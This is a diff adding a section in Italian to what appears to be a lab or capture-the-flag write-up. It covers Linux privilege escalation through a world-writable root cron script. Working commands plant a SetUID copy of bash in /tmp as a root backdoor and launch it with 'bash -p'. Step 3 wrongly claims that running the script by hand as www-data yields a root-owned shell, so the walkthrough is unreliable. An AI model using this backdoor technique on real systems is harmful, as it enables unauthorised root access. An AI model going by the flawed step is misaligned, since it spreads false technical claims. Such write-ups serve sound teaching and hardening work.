@@ -182,3 +182,102 @@ L'utilizzo dell'exploit PwnKit ci ha permesso di ottenere privilegi **root** par
 ---
 
 # 🚀 **Missione completata con successo!**
+
+---
+
+# 📌Privilege Escalation tramite Cron Job e Backdoor SetUID
+
+### **Descrizione del problema**
+Scoperto un altro approccio con cron job configurato in `/etc/crontab` esegue lo script `/usr/local/bin/cleanup` come utente **root**. Tuttavia, lo script ha permessi **world-writable** (`rwxrwxrwx`), permettendo a chiunque di modificarlo.
+
+Questa configurazione consente di sfruttare una **vulnerabilità di privilegio** per ottenere accesso root.
+
+---
+
+### **Dettagli del Sistema**
+- **Utente iniziale**: `www-data`
+- **Percorso vulnerabile**: `/usr/local/bin/cleanup`
+- **Permessi**: `-rwxrwxrwx root root`
+- **Cron job**: 
+   ```bash
+   * * * * * root /usr/local/bin/cleanup
+   ```
+
+---
+
+### **Obiettivo**
+Effettuare **escalation di privilegi** sfruttando il cron job per creare una **backdoor** con il bit **SetUID** attivo, permettendo l’esecuzione di una shell con privilegi root.
+
+---
+
+## 🛠️ **Step-by-Step dell'Exploit**
+
+### **1. Identificazione della vulnerabilità**
+L'utente `www-data` ha trovato un cron job configurato per eseguire `/usr/local/bin/cleanup` con permessi root ogni minuto. Lo script aveva permessi **modificabili** da chiunque:
+
+```bash
+ls -l /usr/local/bin/cleanup
+-rwxrwxrwx 1 root root 44 Dec 14 21:24 /usr/local/bin/cleanup
+```
+
+---
+
+### **2. Creazione della Backdoor SetUID**
+L'obiettivo era copiare il binario `/bin/bash` in `/tmp` e applicare il bit **SetUID**.
+
+#### **Comando inserito nello script `cleanup`**:
+```bash
+echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /usr/local/bin/cleanup
+```
+
+- **`cp /bin/bash /tmp/rootbash`**: copia il binario `bash` nella cartella `/tmp`.
+- **`chmod +s /tmp/rootbash`**: imposta il bit **SetUID**, permettendo al file di essere eseguito con privilegi root.
+
+---
+
+### **3. Esecuzione Manuale del Cron Job**
+Sebbene il cron job sia configurato per eseguirsi automaticamente ogni minuto, in questo caso **non viene eseguito automaticamente**. È necessario forzarne l'esecuzione manualmente con:
+
+```bash
+/usr/local/bin/cleanup
+```
+
+---
+
+### **4. Ottenimento della Shell Root**
+Una volta eseguito il cron job, il file `/tmp/rootbash` diventa un binario eseguibile con privilegi root. Per ottenere la shell root:
+
+```bash
+/tmp/rootbash -p
+```
+
+- **`-p`**: impedisce a `bash` di abbassare i privilegi.
+
+---
+
+### **5. Verifica dei Privilegi**
+Conferma l'accesso root eseguendo:
+
+```bash
+whoami
+
+```
+
+**Output**:
+```
+root
+```
+
+![CronJobs](./CronJobsSUCCESS.png)
+
+---
+
+## 🏆 **Conclusione**
+L'escalation di privilegi è stata ottenuta sfruttando:
+- **Cron job root** con un **file world-writable**.
+- Creazione di un **binario SetUID** con privilegi root.
+- Forzando manualmente l’esecuzione del cron job.
+
+Questa dimostrazione evidenzia quanto sia pericoloso lasciare script root con permessi **modificabili** e quanto sia importante verificare l’esecuzione automatica dei cron jobs.
+
+🎉 **Esplorazione completata con successo!** 🚀
